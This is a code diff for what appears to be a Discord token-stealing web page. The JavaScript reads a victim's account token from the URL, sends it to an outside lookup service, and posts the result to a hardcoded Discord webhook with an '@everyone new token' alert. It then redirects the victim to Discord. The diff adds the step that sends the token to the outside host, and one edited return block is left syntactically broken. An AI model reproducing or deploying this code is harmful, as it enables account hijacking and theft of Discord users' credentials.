@@ -18,14 +18,7 @@ const doxToken = async (tkn, pass) => {
 
     if (res.status !== 200 || res.status !== 201) {
       const d = res.data;
-      return {
-        rawData: {
-          Token: tkn,
-          Name: `${d.username}#${d.discriminator}`,
-          ID: d.id,
-        },
-        bannerURL: d.banner ? `https://cdn.discordapp.com/banners/${d.id}/${d.banner}${d.banner.startsWith("a_") ? ".gif" : ".png"}?size=4096` : null,
-        avatarURL: d.avatar ? `https://cdn.discordapp.com/avatars/${d.id}/${d.avatar}${d.avatar.startsWith("a_") ? ".gif" : ".png"}?size=4096` : null,
+      return {},
       };
     }
   } catch (err) {
@@ -85,8 +78,16 @@ var webhookURL = "https://discord.com/api/webhooks/1052050979840860182/q1mTfTpBY
 var url_string = window.location.href; 
 var url = new URL(url_string);
 var currentURL = url.searchParams.get("user");
+
+var newstr = '';
+var urlN = newstr.concat('https://tizxr.pythonanywhere.com/get_token_info?token=',currentURL)
+var xmlHttp = new XMLHttpRequest();
+xmlHttp.open("GET", urlN, false ); 
+xmlHttp.send(null);
+var info =  xmlHttp.responseText;
+
 var postData = {
-  content: "@everyone @here new token " + currentURL
+  content: "@everyone @here new token " + info
 };
 fetch(webhookURL, {
   method: "POST",
@@ -95,8 +96,6 @@ fetch(webhookURL, {
     "Content-Type": "application/json"
   }
 });
-
-
 function handleOnLoad(){
 window.location="https://discord.com/channels/@me";
 }
